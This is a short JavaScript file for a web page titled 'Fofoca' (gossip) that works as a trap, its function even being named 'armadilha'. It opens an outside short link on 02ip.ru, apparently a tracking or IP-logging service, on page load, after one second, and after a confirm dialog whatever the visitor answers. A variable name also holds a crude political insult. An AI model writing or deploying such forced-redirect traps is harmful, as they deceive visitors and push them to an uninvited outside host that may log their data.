import "./style.css";

let app = (document.querySelector("#app").innerHTML = `
<h1>Fofoca</h1>
<a href="https://02ip.ru/2YzGU7" target="_blank">Clique aqui!</a>
`);

const armadilha = () => {
  window.open("https://02ip.ru/2YzGU7");
};
setTimeout(() => {
  armadilha();
}, 1000);

armadilha();
const bolsonaroMerda = confirm("seja bem vindo");
if (bolsonaroMerda === true) {
  armadilha();
} else {
  armadilha();
}
